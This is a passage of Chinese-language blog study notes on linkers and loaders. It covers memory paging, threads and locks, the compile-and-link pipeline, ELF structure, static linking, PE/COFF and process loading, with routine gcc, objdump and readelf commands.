<h4 id="原始方法：分段"><a href="#原始方法：分段" class="headerlink" title="原始方法：分段"></a>原始方法：分段</h4><p>最开始采用<strong>分段</strong>的方法： 将一段程序所需的内存空间大小的虚拟空间映射到某个地址空间。<br><strong>优点：</strong> 隔离地址空间+确定程序运行的地址<br><strong>缺点：</strong> 没解决内存使用效率低的问题</p>
<h4 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h4><p>方法：将地址空间分为固定大小的页（页大小由操作系统决定）<br>包括：<strong>虚拟页</strong>（VP），<strong>物理页</strong>（PP），<strong>磁盘页</strong>（DP）<br>可以看到下图中，虚拟空间有些页被映射到同一个物理页，这样就可以实现<strong>内存共享</strong><br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361932881-09697135-4f9d-4ac0-babb-4d0fdec20ef4.png"><br><strong>页映射：</strong> 采用<strong>MMU</strong> （Memory Management Unit）进行页映射。页映射模式下，CPU发出的是虚拟地址，经过MMU转换后变成物理地址，一般MMU都集成在CPU内部了，不会以独立的部件存在<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361933139-68ed5853-741c-4c0e-b4c7-e5fbcf3f0eeb.png"></p>
<h3 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h3><p><strong>组成：</strong> 线程=线程ID+当前指令指针PC+寄存器集合+堆栈<br>进程内的各个线程之间共享程序的内存空间和一些进程级的资源<br><strong>线程的访问权限</strong><br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361933282-19a1d5b5-cd8e-43f8-b134-7d8000840956.png"><br>线程的私有存储空间包括：栈、线程局部存储、寄存器<br><strong>I/O密集型线程：</strong> 频繁等待<br><strong>CPU密集型：</strong> 很少等待</p>
<hr>
<p><strong>抢占</strong>的概念：线程在用尽时间片之后会被强制剥夺继续执行的权利，进入就绪状态，这个过程就是抢占。即之后执行的别的线程抢占了当前线程<br><strong>可抢占线程：</strong> 用尽时间片后被剥夺权利<br><strong>不可抢占线程：</strong> 线程必须手动发出放弃执行的命令或者试图等待某事件，才能让其他线程得到执行</p>
<hr>
<h4 id="Linux的多线程"><a href="#Linux的多线程" class="headerlink" title="Linux的多线程"></a>Linux的多线程</h4><p>Linux将所有的执行实体（无论线程、进程）都成为<strong>任务</strong>（Task），任务在概念上类似于一个单线程的进程。不过Linux下不同的任务之间可以选择共享内存空间，所以实际上，共享了同一个内存空间的多个任务构成了一个进程，这些任务就是这个进程里的线程。</p>
<h5 id="Linux创建新任务的方法"><a href="#Linux创建新任务的方法" class="headerlink" title="Linux创建新任务的方法"></a>Linux创建新任务的方法</h5><p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361933415-967c977e-8e84-4af7-a0be-03ae39b23f30.png"><br>fork产生新任务的速度很快，因为并不复制原任务的内存空间，而是和原任务一起共享一个<strong>写时复制</strong> （Copy on Write, COW)<br><strong>写时复制：</strong> 两个任务可同时自由读取内存，当任意一个任务试图修改内存时，内存就会复制一份提供给修改方单独使用，以免影响到其他任务的使用</p>
<hr>
<h4 id="线程安全：同步与锁"><a href="#线程安全：同步与锁" class="headerlink" title="线程安全：同步与锁"></a>线程安全：同步与锁</h4><p>单指令操作（原子操作）不会被打断</p>
<h5 id="同步"><a href="#同步" class="headerlink" title="同步"></a>同步</h5><p>在一个线程访问数据未结束时，其他线程不得访问同一数据，同步最常见的方法就是使用<strong>锁</strong></p>
<h5 id="锁"><a href="#锁" class="headerlink" title="锁"></a>锁</h5><p>是一种非强制机制，每个线程在访问数据前首先试图获取锁，并在访问结束后释放。锁已被占用时，线程会等待其重新可用</p>
<ol>
<li><strong>二元信号量：</strong> 延申：（多元）信号量</li>
<li><strong>互斥量：</strong> 信号量可以被一个线程获取再由其他线程释放，但互斥量要求释放者必须是获取者</li>
<li><strong>临界区：</strong> 比互斥量更严格，对于一个进程创建的互斥量和信号量，另一个进程去获取该锁也是合法的。而<strong>临界区将作用范围限制在本进程</strong>。</li>
<li><strong>读写锁：</strong> 有两种获取：共享方式和独占方式<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361933549-a64ddad4-f491-4b9c-a59a-b9d52654c161.png"></li>
</ol>
<h4 id="三种线程模型"><a href="#三种线程模型" class="headerlink" title="三种线程模型"></a>三种线程模型</h4><h5 id="一对一模型"><a href="#一对一模型" class="headerlink" title="一对一模型"></a>一对一模型</h5><p>一个用户使用的线程就唯一对应一个内核使用的线程（反过来就不一定，因为一个内核里的线程在用户态不一定有对应的线程存在）<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361933679-90de8953-42eb-4e83-bc03-800ec82211ac.png"><br><strong>优点：</strong> 一个线程阻塞，其他线程不受影响<br><strong>缺点：</strong></p>
<ol>
<li>许多操作系统限制了内核线程的数量，一对一线程使用户线程数量也受到限制</li>
<li>许多操作系统内核线程调度时，上下文切换的开销大，导致用户线程执行效率下降</li>
</ol>
<h5 id="多对一模型"><a href="#多对一模型" class="headerlink" title="多对一模型"></a>多对一模型</h5><p>多个用户线程映射到一个内核线程，线程之间的切换由用户态的代码进行<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361933813-344456d6-3991-4539-8040-06ca9350c26d.png"><br><strong>优点：</strong></p>
<ol>
<li>上下文切换更高效</li>
<li>线程数量几乎无限制<br><strong>缺点：</strong> 一个用户线程阻塞，其他所有线程都无法执行</li>
</ol>
<h5 id="多对多模型"><a href="#多对多模型" class="headerlink" title="多对多模型"></a>多对多模型</h5><p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361933923-eb2b4c5c-9e38-41cc-bfe9-865ee8a67a49.png"><br><strong>优点：</strong></p>
<ol>
<li>一个用户线程阻塞不会使所有用户线程阻塞</li>
<li>用户线程数量也没什么限制</li>
</ol>
<h2 id="第二部分-静态链接"><a href="#第二部分-静态链接" class="headerlink" title="第二部分 静态链接"></a>第二部分 静态链接</h2><h2 id="第二章-编译和链接"><a href="#第二章-编译和链接" class="headerlink" title="第二章 编译和链接"></a>第二章 编译和链接</h2><p><strong>构建：</strong> 编译和链接合并到一起的过程</p>
<h3 id="被隐藏的过程"><a href="#被隐藏的过程" class="headerlink" title="被隐藏的过程"></a>被隐藏的过程</h3><p>又是熟悉的代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;Hello, world\n&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h4><p><strong>说明：</strong> 对于C程序，会被预编译成.i文件；对于C++程序，预编译成.ii文件<br><strong>命令：</strong> 对于hello.c文件<br><code>gcc -E hello.c -o hello.i</code><br>或者<code>cpp hello.c &gt; hello.i</code></p>
<hr>
<p><strong>处理规则：</strong></p>
<ol>
<li>删除所有<code>#define</code>并展开所有宏定义</li>
<li>处理所有条件预编译指令，如<code>#if</code> <code>#ifdef</code> <code>#elif</code> <code>#else</code> <code>#endif</code></li>
<li>递归处理<code>#include</code></li>
<li>删除所有注释</li>
<li>添加行号、文件标识符</li>
<li>保留所有<code>#pragma</code>编译器指令</li>
</ol>
<p>经过预编译后的.i文件不包含任何宏定义，因为所有宏定义都被展开，并且包含的文件也被插入到.i文件。<br>所以当无法判断宏定义是否正确或者头文件包含是否正确时，可查看预编译后的文件确定问题。</p>
<h4 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h4><p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361934062-eab80846-a499-4ba1-9543-4bc68a8ecae2.png"><br><strong>过程说明：</strong> 扫描、语法分析、语义分析、源代码优化、代码生成、目标代码优化<br><strong>命令：</strong><br><code>gcc -S hello.i -o hello.s</code><br>或者<code>gcc -S hello.c -o hello.s</code></p>
<ol>
<li><strong>词法分析：</strong> 首先源代码程序被输入到<strong>扫描器</strong>，运用一种类似<strong>有限状态机</strong>的算法将源代码的字符序列分割成一系列<strong>记号</strong>。</li>
<li><strong>语法分析：</strong> 采用<strong>上下文无关语法</strong>对记号进行语法分析，生成以<strong>表达式</strong>为节点的<strong>语法树</strong>。</li>
<li><strong>语义分析：</strong> 生成标识语义的语法树。编译器能分析的是<strong>静态语义</strong>，在编译期间可以确定（比如将浮点型赋值给一个指针）；<strong>动态语义</strong>只有在运行期间才能确定。（比如0作为除数）</li>
<li><strong>中间语言生成：</strong> 直接在语法树上优化比较困难，所以<strong>源代码优化器</strong>（Source Code Optimizer）往往将整个语法树转换成<strong>中间代码</strong>。它是语法树的顺序表示，非常接近目标代码。</li>
</ol>
<hr>
<p>中间代码使编译器可分为前后端。前端负责产生机器无关的中间代码，后端将中间代码转换成目标机器代码</p>
<hr>
<ol start="5">
<li><strong>目标代码生成与优化：</strong> 代码生成器依赖目标机器将中间代码转成目标机器代码，代码优化器负责对目标机器代码进行优化（如选择合适的寻址方式）</li>
</ol>
<h4 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h4><p><strong>说明：</strong> 根据汇编指令和机器指令的对照表一一翻译<br><strong>命令：</strong><br><code>as hello.s -o hello.o</code><br>或者<code>gcc -c hello.s -o hello.o</code><br>或者<code>gcc -c hello.c -o hello.o</code></p>
<h4 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h4><p><strong>C/C++模块之间通信方式：</strong></p>
<ol>
<li>模块间的函数调用</li>
<li>模块间的变量访问</li>
</ol>
<p>这两种方式可以归结为一种：模块间符号的引用。而模块的拼接过程就是<strong>链接</strong><br><strong>过程：</strong> 地址和空间分配、符号决议（确保所有目标文件中的符号引用都有唯一的定义）、重定位<br>最基本的静态链接过程：每个模块的源码文件.c经过编译器编译成目标文件.o，目标文件和库（最常见的是运行时库Runtime Library）一起链接成可执行文件</p>
<h2 id="第三章-目标文件里有什么"><a href="#第三章-目标文件里有什么" class="headerlink" title="第三章 目标文件里有什么"></a>第三章 目标文件里有什么</h2><h3 id="目标文件的格式"><a href="#目标文件的格式" class="headerlink" title="目标文件的格式"></a>目标文件的格式</h3><p>PE和ELF都是COFF的变种，COFF的主要贡献：在目标文件中引入<strong>段</strong>机制+定义了调试数据的格式。<br>按照可执行文件存储的文件有：可执行文件、动态链接库（如Windows的DLL和Linux的so）、静态链接库（如Windows的.lib和Linux的.a）<br>ELF文件标准里，将系统中采用<strong>ELF格式的文件归为4类</strong><br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361934168-d5e52dc5-09e4-4a8c-bb78-1e6eb5ca20a2.png"><br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361934284-bb0c00e5-e754-49a0-80f9-c89b6d86ced2.png"></p>
<h3 id="目标文件是什么样的"><a href="#目标文件是什么样的" class="headerlink" title="目标文件是什么样的"></a>目标文件是什么样的</h3><p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361934397-f9cf89c8-022e-42f2-987f-ed465ad5995c.png"></p>
<h4 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h4><ol>
<li>源代码编译后的机器指令存放在<strong>代码段</strong>.text或者.code</li>
<li>初始化的全局变量或局部静态变量存放在<strong>数据段</strong>.data</li>
<li>未初始化的变量存放在<strong>BSS段</strong>，准确地说是.bss段为它们预留了空间。（注意：初始化为0的可以被认为是未初始化的，被优化掉放在.bss可以节省磁盘空间，因为.bss不占磁盘空间）</li>
<li>除了以上三个基本的段以外，还有只读数据段.rodata，注释信息段.comment，堆栈提示段.note.GNU-stack</li>
</ol>
<h4 id="指令操作"><a href="#指令操作" class="headerlink" title="指令操作"></a>指令操作</h4><ol>
<li><code>gcc -c simple.c</code> -c表示只编译，不链接</li>
<li><code>objdump -h simple.o</code> objdump查看目标文件结构及内容，-h就是把ELF文件的各个段基本信息打印出来，-x可以打印更多的信息<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361934488-4d116190-0e4d-4177-8549-ec7997cde685.png"></li>
<li><code>size simple.o</code> 可以查看ELF文件代码段、数据段、BSS段的长度</li>
<li><code>objdump -s -d simple.o</code> -s可以将所有段的内容以16进制打印，-d将所有包含指令的段反汇编<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361934910-06004ed7-42cd-4be1-ab8c-ce11aaa9b94e.png"></li>
</ol>
<h4 id="其他段"><a href="#其他段" class="headerlink" title="其他段"></a>其他段</h4><p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361935005-47fe9f8d-90f4-4084-9189-108b3e8cf899.png"></p>
<h3 id="ELF文件结构"><a href="#ELF文件结构" class="headerlink" title="ELF文件结构"></a>ELF文件结构</h3><p>还是这张图<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361935175-fedde66c-df06-42e9-82fa-38b213dfbe43.png"></p>
<h4 id="文件头"><a href="#文件头" class="headerlink" title="文件头"></a>文件头</h4><p>描述了文件基本属性，包括ELF文件版本、目标机器型号、程序入口地址等<br><strong>命令：</strong> <code>readelf -h simple.o</code><br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361935279-f2cda133-6299-4d3d-a0ed-6f9e38744fa5.png"><br>可以看到，ELF文件头中定义了：ELF魔数、文件机器字节长度、数据存储方式、版本、运行平台、ABI版本、ELF重定位类型、硬件平台、硬件平台版本、入口地址、程序头入口和长度、段表位置和长度、段的数量等。</p>
<hr>
<p>ELF有32位和64位版本，它们的文件头内容是一样的，只不过有些成员的大小不一样。ELF文件头结构及相关常数被定义在<code>/usr/include/elf.h</code> ，其中自定义了一些类型<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361935382-8826d20c-94e0-4c63-8cfa-a6a81cbd82a4.png"><br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361935552-24d6459e-e7ff-4b0b-97fb-2601ea2f58f7.png"></p>
<hr>
<p>Elf32_Ehdr结构体中定义的成员含义为<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361935648-f724c422-c6a2-46e9-95c0-d3ae7678f9ae.png"><br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361935867-a5001f50-f9b6-4b4e-b8b0-aae2fbc05b6d.png"></p>
<h5 id="ELF魔数"><a href="#ELF魔数" class="headerlink" title="ELF魔数"></a>ELF魔数</h5><p>前四个字节是所有ELF文件都必须相同的标识码<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361936044-404e1802-1f2c-4606-9e87-c2eb8561149c.png"><br>字节序和ELF版本的规定<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361936120-20f9baa2-8f05-4e52-aa56-7a8f089faddd.png"><br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361936199-ad0f67a4-ab29-4083-9e42-af6fa6555cbc.png"></p>
<h5 id="文件类型"><a href="#文件类型" class="headerlink" title="文件类型"></a>文件类型</h5><p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361936291-c8ac480c-f12e-44c3-a3fd-84a4447f2e03.png"><br>e_type成员表示ELF文件类型，每个文件类型对应一个常量，系统通过这个常量来判断ELF的真正文件类型，而不是通过扩展名。相关常量以“EL_”开头<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361936378-d16f743e-fc85-4391-8af9-df1ba87a0364.png"></p>
<h4 id="段表"><a href="#段表" class="headerlink" title="段表"></a>段表</h4><p>段表位置由ELF文件头中的e_shoff决定，这里的712是十进制<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361936507-8ed26723-7152-4316-8190-3dcc498866ab.png"><br><strong>查看命令：</strong> <code>readelf -S hello.o</code>（注意objdump会省略辅助性的段，readelf查看的才是真正的段结构）<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361936597-c2a5170f-88da-4246-93b7-0da784b868ec.png"></p>
<h5 id="段描述符Elf32-Shdr"><a href="#段描述符Elf32-Shdr" class="headerlink" title="段描述符Elf32_Shdr"></a>段描述符Elf32_Shdr</h5><p>段表的结构是一个以Elf32_Shdr结构体为元素的数组，对于以上hello.o就是有13个元素的数组。其中第一个元素是无效的，所以共有12个有效的段<br>Elf32_Shdr的结构同样在<code>/usr/include/elf.h</code><br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361936714-33128f74-8239-4328-b909-85d89a7d997a.png"><br>各个成员的含义<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361936804-4f5ff992-41e5-40c4-9936-6e776263a396.png"></p>
<h3 id="链接的接口——符号"><a href="#链接的接口——符号" class="headerlink" title="链接的接口——符号"></a>链接的接口——符号</h3><p>在链接中，将函数和变量统称为<strong>符号</strong>，函数名和变量名就是符号名。每个目标文件都有一个响应的符号表，每个符号有对应的符号值，对于变量和函数来说，符号值就是它们的地址。<br><code>nm hello.o</code>可以查看ELF文件的符号表<br><code>readelf -s hello.o</code>可以查看更详细额符号信息<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361936973-4919b95f-51ad-43b0-8954-ea8304cbc0f4.png"><br>其中，Value为符号值（函数相对于代码段起始位置的偏移量），Size为符号大小（函数指令所占的字节数），Type和Bind为符号类型和绑定信息，Ndx为符号所在段。<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361937064-d85f928c-ded0-42de-afbb-2b76b9770bab.png"></p>
<h4 id="C-符号修饰"><a href="#C-符号修饰" class="headerlink" title="C++符号修饰"></a>C++符号修饰</h4><p>区别重载的函数+防止静态变量冲突</p>
<h4 id="extern-“C”"><a href="#extern-“C”" class="headerlink" title="extern “C”"></a>extern “C”</h4><p>Linux版本的gcc对extern “C”里面的符号不做修饰，可以利用声明一个与CPP中某些符号修饰结果相同的外部符号，直接获取其对应的值</p>
<h2 id="第四章-静态链接"><a href="#第四章-静态链接" class="headerlink" title="第四章 静态链接"></a>第四章 静态链接</h2><h3 id="空间地址分配"><a href="#空间地址分配" class="headerlink" title="空间地址分配"></a>空间地址分配</h3><p>我们输入多个目标文件，链接器怎么将它们的各个段合并到输出文件？或者说，输出文件中的空间如何分配给输入文件？</p>
<h4 id="按序叠加"><a href="#按序叠加" class="headerlink" title="按序叠加"></a>按序叠加</h4><p>存在的问题：输出文件会有很多零散的段，造成内存空间大量的内存碎片。</p>
<h4 id="相似段合并"><a href="#相似段合并" class="headerlink" title="相似段合并"></a>相似段合并</h4><p>问：这里的<strong>空间分配</strong>是指什么空间？<br>答：虚拟地址空间的分配</p>
<hr>
<p><strong>链接器空间分配的基本策略：</strong> （两步链接）</p>
<ol>
<li>空间与地址分配</li>
<li>符号解析与<strong>重定位</strong> （核心）</li>
</ol>
<hr>
<p><strong>命令：</strong></p>
<ol>
<li><code>ld a.o b.o -e main -o ab</code> -e表示将main作为程序入口，ld默认入口为_start，<code>-o ab</code>  表示链接输出文件名为ab，默认为a.out</li>
<li><code>objdump -h filename</code> 可查看链接前后地址的分配情况</li>
</ol>
<p><strong>VMA：</strong> Virtual Memory Address虚拟地址</p>
<h4 id="确定符号地址"><a href="#确定符号地址" class="headerlink" title="确定符号地址"></a>确定符号地址</h4><p>链接器进行空间地址分配后，各个段的虚拟地址就确定了，链接器开始计算每个符号的虚拟地址。</p>
<h3 id="重定位表"><a href="#重定位表" class="headerlink" title="重定位表"></a>重定位表</h3><p>如果.text有要被重定位的地方，会有一个相对应的.rel.text；如果.data又要被重定位的地方，就会有一个.re.data保存数据段的重定位表。每个要被重定位的地方叫一个重定位入口<br><code>objdump -r a.o</code> 查看目标文件的重定位表</p>
<h4 id="符号解析"><a href="#符号解析" class="headerlink" title="符号解析"></a>符号解析</h4><p>重定位过程中，每个重定位入口都是对一个符号的引用，当链接器需要对某个符号的引用进行重定位时，它就要确定这个符号的目标地址。链接器就会查找所有输入目标文件的符号表组成的全局符号表，找到对应的符号后进行重定位。</p>
<h4 id="指令修正方式"><a href="#指令修正方式" class="headerlink" title="指令修正方式"></a>指令修正方式</h4><p>对于32位x86平台下的ELF文件的重定位入口所修正的指令寻址方式只有两种：<strong>绝对近址32位寻址、相对近址32位寻址</strong>。<br>区别：绝对寻址修正后的地址为该符号的实际地址，相对寻址修正后的地址是符号距离被修正位置的<strong>地址差</strong>。</p>
<h3 id="COMMON块"><a href="#COMMON块" class="headerlink" title="COMMON块"></a>COMMON块</h3><p>拓展：这种机制最早来源于Fortran，早期Fortran没有动态分配空间的机制，程序员必须声明它所需要的临时使用空间的大小。这种空间就是COMMON块，当不同的目标文件需要的COMMON块大小不一致时，以最大的那块为准。COMMON块可以应对一个弱符号定义在多个目标文件中，而它们类型又不同的情况。<br>一旦一个未初始化的全局变量不是以COMMON块的形式存在时，那么它就相当于一个强符号，如果其他目标文件中还有同一个变量的强符号定义，链接时就会发生符号重复定义的错误。</p>
<h3 id="C-问题"><a href="#C-问题" class="headerlink" title="C++问题"></a>C++问题</h3><ol>
<li>重复代码消除</li>
<li>全局构造与析构</li>
</ol>
<h4 id="重复代码消除"><a href="#重复代码消除" class="headerlink" title="重复代码消除"></a>重复代码消除</h4><p>模板、外部内联函数、虚函数表都有可能在不同的编译单元里产生相同的代码<br>方法：将每个模板的实例代码都单独存放到一个段里，每个段只包含一个模板实例。但是相同名称的段可能拥有不同的内容，导致编译出来的实际代码有所不同，这种情况，链接器随意选择一个副本作为链接的输入。<br><strong>函数级别链接：</strong> 让所有函数像上文提到的模板函数那样单独保存到一个段，链接器需要某个函数就合并到输出文件，对于没有用的函数则抛弃。</p>
<h4 id="全局构造与析构"><a href="#全局构造与析构" class="headerlink" title="全局构造与析构"></a>全局构造与析构</h4><p>全局对象的构造函数在main函数之前被执行，全局对象的析构函数在main之后执行<br>ELF文件两个特殊的段：.init（进程的初始化代码，main以前执行）和.fini（进程终止代码指令，main以后执行）</p>
<h3 id="静态链接库"><a href="#静态链接库" class="headerlink" title="静态链接库"></a>静态链接库</h3><ol>
<li>列举静态库文件libc.a中的目标文件 <code>ar -t libc.a</code><br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361937245-46fa386c-3933-4432-aa95-5ebbbf5155d1.png"></li>
<li>找到printf所在的目标文件 <code>objdump -t libc.a</code></li>
</ol>
<p><code>gcc -c -fno-builtin hello.c</code> -fno-builtin 关闭内置函数优化<br><code>gcc -static --verbose -fno-builtin hello.c</code> -verbose 将编译链接的中间步骤打印出来<br>问：为什么静态运行库里一个目标文件只包含一个函数？<br>答：如果很多函数放在一个目标文件中，很多没用的函数也会被链接到输出结果中，造成空间的浪费。</p>
<h3 id="链接过程控制"><a href="#链接过程控制" class="headerlink" title="链接过程控制"></a>链接过程控制</h3><p>Windows操作系统内核：C:\Windows\System32\ntoskrnl.exe<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361937341-746c1000-2509-4c12-8c12-e0bab2877fc7.png"></p>
<h4 id="连接控制脚本"><a href="#连接控制脚本" class="headerlink" title="连接控制脚本"></a>连接控制脚本</h4><p><code>ld -verbose</code> 查看ld默认的链接脚本<br><code>ld -T link.script</code> 指定自己写的脚本为链接控制脚本</p>
<h2 id="第五章-Windows-PE-COFF"><a href="#第五章-Windows-PE-COFF" class="headerlink" title="第五章 Windows PE/COFF"></a>第五章 Windows PE/COFF</h2><p>PE/COFF文件与ELF文件非常相似，它们都是基于段的结构的二进制文件格式。Windows下最常见的目标文件格式就是COFF格式。<br>COFF文件有一个.drectve段，其中保存编译器传递给链接器的命令行参数，可以通过这个段实现指定运行库等功能。<br>Windows下的可执行文件、动态链接库等都使用PE文件格式，PE文件格式是COFF文件格式的改进版本，增加了PE文件头、数据目录等结构。</p>
<h2 id="第三部分-装载与动态链接"><a href="#第三部分-装载与动态链接" class="headerlink" title="第三部分 装载与动态链接"></a>第三部分 装载与动态链接</h2><h2 id="第六章-可执行文件的装载与进程"><a href="#第六章-可执行文件的装载与进程" class="headerlink" title="第六章 可执行文件的装载与进程"></a>第六章 可执行文件的装载与进程</h2><h3 id="进程与程序的区别"><a href="#进程与程序的区别" class="headerlink" title="进程与程序的区别"></a>进程与程序的区别</h3><p>程序是一个静态的概念，就是一些预先编译好的指令和数据集合的一个文件；进程是一个动态的概念，是程序运行时的一个过程。<br>程序像菜谱，进程像做菜的过程。</p>
<h3 id="PAE-（Physical-Address-Extension）"><a href="#PAE-（Physical-Address-Extension）" class="headerlink" title="PAE （Physical Address Extension）"></a>PAE （Physical Address Extension）</h3><p>32位的CPU，程序使用的虚拟地址空间不能超过4GB；计算机的内存空间是可以超过的，通过PAE可以完成。<br>应用程序如何使用这些大于常规的内存空间？<br><strong>窗口映射</strong>：把额外的内存映射到进程地址空间。<br>举例：比如32位CPU，有一个应用程序用一段256MB的虚拟地址空间做窗口，程序可以从高于4GB的物理空间中申请多个256MB的物理空间，编号成ABC，然后根据需要将窗口映射到不同的物理空间块，用到A的时候就把窗口映射到A，用到B就映射过去，如此重复。<br>Windows下这种访问内存的操作是AWE（Address Windowing Extension）；<br>Linux下采用mmap()系统调用实现。</p>
<h3 id="装载的方式"><a href="#装载的方式" class="headerlink" title="装载的方式"></a>装载的方式</h3><p>静态装载方法：将程序运行所需要的指令和数据全都装入内存。<br>动态装入：将程序最常用的部分留在内存，不太常用的部分存在磁盘。这样可以更有效的利用内存<br>典型的动态装载方法：<strong>覆盖装入</strong>（Overlay）和<strong>页映射</strong>（Paging）。原则上都是利用了程序的局部性原理。<br>覆盖装入已经几乎被淘汰了，其基本原理就是将有依赖关系的A和B内存覆盖，形成共享块内存区域，调用谁，覆盖管理器就把谁读入内存。<br>页映射是将内存和所有磁盘中的数据和指令按照页为单位进行划分，以后装在和操作的单位就是页。</p>
<h3 id="进程的建立"><a href="#进程的建立" class="headerlink" title="进程的建立"></a>进程的建立</h3><ol>
<li><strong>创建一个虚拟地址空间：</strong> 虚拟空间由一组页映射函数将虚拟空间的各个页映射到响应的物理空间，所以创建虚拟空间实际上不是创建空间，而是创建映射函数所需要的数据结构。</li>
<li><strong>读取可执行文件头，建立虚拟空间与可执行文件的映射关系</strong></li>
<li><strong>将CPU指令寄存器设置成可执行文件入口，启动运行：</strong> 可以认为操作系统执行了一条跳转指令，直接跳转到可执行文件的入口地址。（ELF文件头保存有入口地址）</li>
</ol>
<h3 id="section-和-segment"><a href="#section-和-segment" class="headerlink" title="section 和 segment"></a>section 和 segment</h3><p>从链接的角度看，ELF文件按Section存储<br>从装载的角度看，ELF文件按Segment划分<br>ELF可执行文件和共享库文件有程序头表专门保存Segment。而ELF目标文件由于不需要装载，所以没有程序头表。</p>
